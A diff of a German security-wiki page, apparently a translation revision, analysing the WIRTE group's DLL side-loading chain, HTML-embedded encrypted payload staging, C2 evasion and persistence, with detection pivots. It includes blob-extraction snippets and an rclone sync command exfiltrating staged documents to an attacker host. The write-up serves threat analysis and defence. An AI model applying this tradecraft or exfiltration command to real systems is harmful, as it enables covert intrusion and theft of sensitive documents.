@@ -1,22 +1,22 @@
-# Advanced DLL Side-Loading With HTML-Embedded Payload Staging
+# Fortgeschrittene DLL Side-Loading mit HTML-Embedded Payload Staging
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Tradecraft-Überblick
+## Tradecraft-Übersicht
 
-Ashen Lepus (aka WIRTE) hat ein wiederholbares Muster genutzt, das DLL sideloading, staged HTML payloads und modulare .NET backdoors verknüpft, um in diplomatischen Netzwerken im Nahen Osten persistent zu bleiben. Die Technik ist von jedem Operator wiederverwendbar, weil sie auf Folgendem basiert:
+Ashen Lepus (aka WIRTE) setzte ein wiederholbares Muster ein, das DLL sideloading, staged HTML payloads und modulare .NET-Backdoors verknüpft, um in diplomatischen Netzwerken im Nahen Osten persistent zu bleiben. Die Technik ist für jeden Operator wiederverwendbar, weil sie auf Folgendem beruht:
 
-- **Archive-based social engineering**: harmlose PDFs weisen Ziele an, ein RAR-Archiv von einer File-Sharing-Seite herunterzuladen. Das Archiv bündelt einen echt wirkenden Dokumenten-Viewer EXE, eine bösartige DLL mit dem Namen einer vertrauenswürdigen Bibliothek (z. B. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) und eine Lockvogel-Datei `Document.pdf`.
-- **DLL search order abuse**: das Opfer doppelklickt das EXE, Windows löst den DLL-Import aus dem aktuellen Verzeichnis auf, und der bösartige Loader (AshenLoader) läuft im vertrauenswürdigen Prozess, während die Lockvogel-PDF geöffnet wird, um Verdacht zu vermeiden.
-- **Living-off-the-land staging**: jede spätere Stufe (AshenStager → AshenOrchestrator → modules) bleibt bis zur Nutzung vom Datenträger fern und wird als verschlüsselte Blobs geliefert, die in ansonsten harmlosen HTML-Antworten verborgen sind.
+- **Archive-based social engineering**: harmlose PDFs fordern Ziele auf, ein RAR-Archiv von einer File-Sharing-Seite herunterzuladen. Das Archiv bündelt einen echt aussehenden Document Viewer EXE, eine bösartige DLL, die nach einer vertrauenswürdigen Bibliothek benannt ist (z. B. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), und eine Lockvogel-`Document.pdf`.
+- **DLL search order abuse**: das Opfer doppelklickt die EXE, Windows löst den DLL-Import aus dem aktuellen Verzeichnis auf, und der bösartige Loader (AshenLoader) läuft im vertrauenswürdigen Prozess, während die Lockvogel-PDF geöffnet wird, um keinen Verdacht zu erregen.
+- **Living-off-the-land staging**: jede spätere Stufe (AshenStager → AshenOrchestrator → modules) verbleibt bis zur Verwendung nicht auf der Festplatte und wird als verschlüsselte Blobs geliefert, die in ansonsten harmlosen HTML-Antworten versteckt sind.
 
-## Multi-Stage Side-Loading Chain
+## Mehrstufige Side-Loading-Kette
 
-1. **Decoy EXE → AshenLoader**: das EXE side-loadet AshenLoader, welcher Host-Recon durchführt, ihn mit AES-CTR verschlüsselt und per POST in rotierenden Parametern wie `token=`, `id=`, `q=` oder `auth=` an API-ähnliche Pfade sendet (z. B. `/api/v2/account`).
-2. **HTML extraction**: der C2 gibt die nächste Stufe nur preis, wenn die Client-IP in die Zielregion geolokalisiert wird und der `User-Agent` mit dem Implantat übereinstimmt, wodurch Sandboxes umgangen werden. Wenn die Prüfungen bestanden sind, enthält der HTTP-Body einen `<headerp>...</headerp>`-Blob mit dem Base64/AES-CTR-verschlüsselten AshenStager-Payload.
-3. **Second sideload**: AshenStager wird zusammen mit einer weiteren legitimen Binärdatei bereitgestellt, die `wtsapi32.dll` importiert. Die in die Binärdatei injizierte bösartige Kopie holt mehr HTML und extrahiert diesmal `<article>...</article>`, um AshenOrchestrator wiederherzustellen.
-4. **AshenOrchestrator**: ein modularer .NET-Controller, der eine Base64-kodierte JSON-Konfiguration decodiert. Die Felder `tg` und `au` der Konfiguration werden verkettet/gehasht und bilden den AES-Schlüssel, der `xrk` entschlüsselt. Die resultierenden Bytes fungieren als XOR-Schlüssel für jeden danach abgerufenen Modul-Blob.
-5. **Module delivery**: jedes Modul wird durch HTML-Kommentare beschrieben, die den Parser zu einem beliebigen Tag umleiten und statische Regeln umgehen, die nur nach `<headerp>` oder `<article>` suchen. Module umfassen Persistenz (`PR*`), Deinstallationsprogramme (`UN*`), Aufklärung (`SN`), Bildschirmaufnahme (`SCT`) und Dateierkundung (`FE`).
+1. **Decoy EXE → AshenLoader**: die EXE side-loadet AshenLoader, der Host recon durchführt, AES-CTR verschlüsselt und ihn via POST in rotierenden Parametern wie `token=`, `id=`, `q=` oder `auth=` an API-ähnliche Pfade (z. B. `/api/v2/account`) sendet.
+2. **HTML extraction**: der C2 verrät die nächste Stufe nur, wenn die Client-IP in die Zielregion geolokalisiert wird und der `User-Agent` mit dem Implant übereinstimmt, was Sandboxes frustriert. Wenn die Prüfungen bestanden sind, enthält der HTTP-Body einen `<headerp>...</headerp>`-Blob mit dem Base64/AES-CTR-verschlüsselten AshenStager-Payload.
+3. **Second sideload**: AshenStager wird zusammen mit einer weiteren legitimen Binärdatei deployed, die `wtsapi32.dll` importiert. Die bösartige Kopie, die in die Binärdatei injiziert wurde, holt weiteres HTML und carve´t dieses Mal `<article>...</article>`, um AshenOrchestrator wiederherzustellen.
+4. **AshenOrchestrator**: ein modularer .NET-Controller, der eine Base64 JSON-Konfiguration dekodiert. Die Config-Felder `tg` und `au` werden konkateniert/gehasht und bilden den AES-Schlüssel, mit dem `xrk` entschlüsselt wird. Die resultierenden Bytes dienen anschließend als XOR-Key für jede gefetchte Modul-Blob.
+5. **Module delivery**: jedes Modul wird durch HTML-Kommentare beschrieben, die den Parser zu einem beliebigen Tag umleiten und statische Regeln umgehen, die nur nach `<headerp>` oder `<article>` suchen. Module umfassen Persistenz (`PR*`), Uninstaller (`UN*`), Reconnaissance (`SN`), Screen Capture (`SCT`) und File Exploration (`FE`).
 
 ### HTML-Container-Parsing-Muster
 ```csharp
@@ -26,7 +26,7 @@ var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
 var module = XorBytes(aesBytes, xorKey);
 LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
 ```
-Selbst wenn Verteidiger ein bestimmtes Element blockieren oder entfernen, muss der Operator nur das im HTML-Kommentar angegebene Tag ändern, um die Auslieferung wieder aufzunehmen.
+Selbst wenn Verteidiger ein bestimmtes Element blockieren oder entfernen, muss der Operator nur das im HTML-Kommentar angedeutete tag ändern, um die Auslieferung wieder aufzunehmen.
 
 ### Schneller Extraktionshelfer (Python)
 ```python
@@ -38,53 +38,53 @@ b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
 blob = base64.b64decode(b64)
 # decrypt blob with AES-CTR, then XOR if required
 ```
-## Parallelen zur HTML-Staging-Evasion
+## HTML Staging Evasion Parallels
 
-Recent HTML smuggling research (Talos) hebt Payloads hervor, die als Base64-Strings innerhalb von `<script>`-Blöcken in HTML-Anhängen versteckt und zur Laufzeit via JavaScript decodiert werden. Derselbe Trick lässt sich für C2-Antworten wiederverwenden: verschlüssele Blobs und stage sie innerhalb eines script tags (oder eines anderen DOM-Elements) und dekodiere sie in-memory vor AES/XOR, sodass die Seite wie gewöhnliches HTML aussieht. Talos zeigt außerdem geschichtete Obfuskation (Identifier-Renaming plus Base64/Caesar/AES) innerhalb von script tags, was sich sauber auf HTML-staged C2 blobs abbildet.
+Aktuelle HTML smuggling-Forschung (Talos) hebt Payloads hervor, die als Base64-Strings innerhalb von `<script>`-Blöcken in HTML-Anhängen verborgen sind und zur Laufzeit per JavaScript decodiert werden. Derselbe Trick lässt sich für C2-Antworten wiederverwenden: verschachtelte, verschlüsselte Blobs innerhalb eines `<script>`-Tags (oder eines anderen DOM-Elements) ablegen und sie im Speicher vor AES/XOR-Decodierung entpacken, sodass die Seite wie gewöhnliches HTML aussieht. Talos zeigt auch geschichtete Obfuskation (Identifier-Umbenennung plus Base64/Caesar/AES) innerhalb von `<script>`-Tags, was sich sauber auf HTML-gestagte C2-Blobs abbildet.
 
-## Aktuelle Variantenhinweise (2024-2025)
+## Recent Variant Notes (2024-2025)
 
-- Check Point beobachtete 2024 WIRTE-Kampagnen, die weiterhin auf archive-based sideloading setzten, aber `propsys.dll` (stagerx64) als erste Stufe verwendeten. Der stager dekodiert das nächste Payload mit Base64 + XOR (Key `53`), sendet HTTP-Anfragen mit einem hardcodierten `User-Agent` und extrahiert verschlüsselte Blobs, die zwischen HTML-Tags eingebettet sind. In einem Branch wurde die Stage aus einer langen Liste eingebetteter IP-Strings rekonstruiert, die via `RtlIpv4StringToAddressA` decodiert und dann zu den Payload-Bytes konkatenieret wurden.
-- OWN-CERT dokumentierte frühere WIRTE-Tooling, bei dem der side-loaded `wtsapi32.dll` Dropper Strings mit Base64 + TEA schützte und den DLL-Namen selbst als Decrypt-Key verwendete, bevor Host-Identifikationsdaten XOR/Base64-obfuskiert an den C2 gesendet wurden.
+- Check Point beobachtete 2024 WIRTE-Kampagnen, die weiterhin auf archivbasierte sideloading setzten, aber `propsys.dll` (stagerx64) als erste Stufe verwendeten. Der Stager decodiert die nächste Payload mit Base64 + XOR (Key `53`), sendet HTTP-Anfragen mit einem hartkodierten `User-Agent` und extrahiert verschlüsselte Blobs, die zwischen HTML-Tags eingebettet sind. In einem Zweig wurde die Stufe aus einer langen Liste eingebetteter IP-Strings rekonstruiert, die via `RtlIpv4StringToAddressA` decodiert und dann zu den Payload-Bytes konkateniert wurden.
+- OWN-CERT dokumentierte frühere WIRTE-Tooling-Fassungen, bei denen der side-geloadete `wtsapi32.dll`-Dropper Strings mit Base64 + TEA schützte und den DLL-Namen selbst als Dekryptionsschlüssel nutzte, bevor Host-Identifikationsdaten per XOR/Base64 verschleiert und an das C2 gesendet wurden.
 
-## Krypto- & C2-Härtung
+## Crypto & C2 Hardening
 
-- AES-CTR everywhere: aktuelle Loader betten 256-bit Keys plus Nonces ein (z. B. `{9a 20 51 98 ...}`) und fügen optional eine XOR-Schicht hinzu, wobei Strings wie `msasn1.dll` vor/nach der Dekryptierung verwendet werden.
-- Key-Material-Variationen: frühere Loader nutzten Base64 + TEA, um eingebettete Strings zu schützen; der Decrypt-Key wurde aus dem bösartigen DLL-Namen abgeleitet (z. B. `wtsapi32.dll`).
-- Infrastructure split + subdomain camouflage: Staging-Server sind pro Tool getrennt, über verschiedene ASNs gehostet und werden manchmal durch legitim aussehende Subdomains vorgelagert, sodass das Kompromittieren einer Stage nicht den Rest offenlegt.
-- Recon smuggling: abgerufene Recon-Daten enthalten jetzt Program Files-Listings, um hochgradig wertvolle Apps zu identifizieren, und werden immer verschlüsselt, bevor sie das Host verlassen.
-- URI churn: Query-Parameter und REST-Pfade rotieren zwischen Kampagnen (`/api/v1/account?token=` → `/api/v2/account?auth=`), wodurch fragile Detections ungültig werden.
-- User-Agent pinning + safe redirects: C2-Infrastruktur antwortet nur auf exakte UA-Strings und leitet sonst zu benignen News-/Health-Seiten weiter, um unauffällig zu wirken.
-- Gated delivery: Server sind geo-gegrenzt und beantworten nur echte Implants. Nicht freigeschaltete Clients erhalten unauffälliges HTML.
+- **AES-CTR everywhere**: aktuelle Loader betten 256-bit-Keys plus Nonces ein (z. B. `{9a 20 51 98 ...}`) und fügen optional eine XOR-Schicht unter Verwendung von Strings wie `msasn1.dll` vor/nach der Dekryption hinzu.
+- **Key material variations**: frühere Loader nutzten Base64 + TEA zum Schutz eingebetteter Strings, wobei der Dekryptionsschlüssel aus dem bösartigen DLL-Namen (z. B. `wtsapi32.dll`) abgeleitet wurde.
+- **Infrastructure split + subdomain camouflage**: Staging-Server sind pro Tool getrennt, in verschiedenen ASNs gehostet und werden manchmal durch legitim aussehende Subdomains getarnt, sodass das Abschalten einer Stage nicht den Rest preisgibt.
+- **Recon smuggling**: aufgezählte Daten enthalten nun Program Files-Listings, um hochrelevante Apps zu identifizieren, und werden immer verschlüsselt, bevor sie den Host verlassen.
+- **URI churn**: Query-Parameter und REST-Pfade rotieren kampagnenübergreifend (`/api/v1/account?token=` → `/api/v2/account?auth=`), wodurch fragile Erkennungen ungültig werden.
+- **User-Agent pinning + safe redirects**: C2-Infrastruktur antwortet nur auf exakte UA-Strings und leitet sonst auf harmlose News-/Gesundheitsseiten um, um sich einzufügen.
+- **Gated delivery**: Server sind geo-gegrenzt und antworten nur auf echte Implants. Nicht genehmigte Clients erhalten unauffälliges HTML.
 
 ## Persistence & Execution Loop
 
-AshenStager legt geplante Tasks an, die sich als Windows-Wartungsjobs tarnen und über `svchost.exe` ausgeführt werden, z. B.:
+AshenStager legt Scheduled Tasks ab, die als Windows-Maintenance-Jobs getarnt sind und via `svchost.exe` ausgeführt werden, z. B.:
 
 - `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
 - `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
 - `C:\Windows\System32\Tasks\Automatic Windows Update`
 
-Diese Tasks starten die sideloading-Kette beim Boot oder in Intervallen neu und stellen sicher, dass AshenOrchestrator frische Module anfordern kann, ohne erneut die Festplatte zu berühren.
+Diese Tasks starten die Sideloading-Kette beim Boot oder in Intervallen neu und stellen sicher, dass AshenOrchestrator frische Module anfordern kann, ohne erneut auf die Festplatte zu schreiben.
 
-## Verwendung legitimer Sync-Clients zur Exfiltration
+## Using Benign Sync Clients for Exfiltration
 
-Operatoren stagern diplomatische Dokumente in `C:\Users\Public` (welt-lesbar und unverdächtig) über ein dediziertes Modul und laden dann das legitime [Rclone](https://rclone.org/) Binary herunter, um dieses Verzeichnis mit Angreifer-Speicher zu synchronisieren. Unit42 stellt fest, dass dies das erste Mal ist, dass dieser Actor Rclone zur Exfiltration beobachtet wurde, was dem breiteren Trend entspricht, legitime Sync-Tools zu missbrauchen, um sich in normalen Traffic einzufügen:
+Operatoren legen diplomatische Dokumente in `C:\Users\Public` (weltlesbar und unverdächtig) über ein dediziertes Modul ab und laden dann das legitime [Rclone](https://rclone.org/)–Binary herunter, um dieses Verzeichnis mit Angreifer-Speicher zu synchronisieren. Unit42 stellt fest, dass dies das erste Mal ist, dass dieser Akteur Rclone für Exfiltration nutzt, was dem breiteren Trend entspricht, legitime Sync-Tools zu missbrauchen, um sich in normalen Traffic einzufügen:
 
-1. Stage: kopiere/sammle Ziel-Dateien nach `C:\Users\Public\{campaign}\`.
-2. Configure: liefere eine Rclone-Konfiguration, die auf einen Angreifer-verwalteten HTTPS-Endpunkt zeigt (z. B. `api.technology-system[.]com`).
-3. Sync: führe `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` aus, sodass der Traffic normalen Cloud-Backups ähnelt.
+1. **Stage**: Ziel-Dateien nach `C:\Users\Public\{campaign}\` kopieren/sammeln.
+2. **Configure**: Eine Rclone-Konfiguration liefern, die auf einen Angreifer-gesteuerten HTTPS-Endpunkt zeigt (z. B. `api.technology-system[.]com`).
+3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ausführen, sodass der Traffic normalen Cloud-Backups ähnelt.
 
-Da Rclone weit verbreitet für legitime Backup-Workflows genutzt wird, müssen Verteidiger auf anomale Ausführungen achten (neue Binaries, ungewöhnliche Remotes oder plötzliches Synchronisieren von `C:\Users\Public`).
+Da Rclone weit verbreitet für legitime Backup-Workflows verwendet wird, müssen Verteidiger auf anomale Ausführungen achten (neue Binaries, seltsame Remotes oder plötzliches Synchronisieren von `C:\Users\Public`).
 
-## Erkennungsansätze
+## Detection Pivots
 
-- Alarmieren bei signed processes, die unerwartet DLLs aus user-writable Pfaden laden (Procmon-Filters + `Get-ProcessMitigation -Module`), besonders wenn DLL-Namen mit `netutils`, `srvcli`, `dwampi` oder `wtsapi32` übereinstimmen.
-- Untersuche suspicious HTTPS-Antworten auf große Base64-Blobs, die in ungewöhnlichen Tags eingebettet sind oder durch `<!-- TAG: <xyz> -->`-Kommentare geschützt werden.
-- Erweitere HTML-Hunting auf Base64-Strings innerhalb von `<script>`-Blöcken (HTML smuggling-style staging), die via JavaScript decodiert werden, bevor AES/XOR verarbeitet wird.
-- Suche nach scheduled tasks, die `svchost.exe` mit non-service-Argumenten ausführen oder auf Dropper-Verzeichnisse verweisen.
-- Verfolge C2-Redirects, die nur für exakte `User-Agent`-Strings Payloads zurückliefern und sonst zu legitimen News/Health-Domains weiterleiten.
-- Überwache das Auftauchen von Rclone-Binaries außerhalb IT-verwalteter Orte, neue `rclone.conf`-Dateien oder Sync-Jobs, die von Staging-Verzeichnissen wie `C:\Users\Public` ziehen.
+- Alarm bei **signed processes**, die unerwartet DLLs aus benutzerbeschreibbaren Pfaden laden (Procmon-Filter + `Get-ProcessMitigation -Module`), besonders wenn die DLL-Namen mit `netutils`, `srvcli`, `dwampi` oder `wtsapi32` überlappen.
+- Untersuchen verdächtiger HTTPS-Antworten auf **große Base64-Blobs, die in ungewöhnlichen Tags eingebettet sind** oder durch `<!-- TAG: <xyz> -->`-Kommentare geschützt werden.
+- HTML-Hunting auf **Base64-Strings innerhalb von `<script>`-Blöcken** (HTML smuggling–Style Staging) ausweiten, die per JavaScript decodiert werden, bevor AES/XOR angewendet wird.
+- Nach **Scheduled Tasks** suchen, die `svchost.exe` mit Nicht-Service-Argumenten ausführen oder auf Dropper-Verzeichnisse zurückzeigen.
+- C2-Redirects verfolgen, die nur Payloads für exakte `User-Agent`-Strings zurückgeben und sonst zu legitimen News-/Health-Domains weiterleiten.
+- Auf **Rclone**-Binaries achten, die außerhalb IT-verwalteter Orte auftauchen, neue `rclone.conf`-Dateien oder Sync-Jobs, die von Staging-Verzeichnissen wie `C:\Users\Public` ziehen.
 
 ## References
 
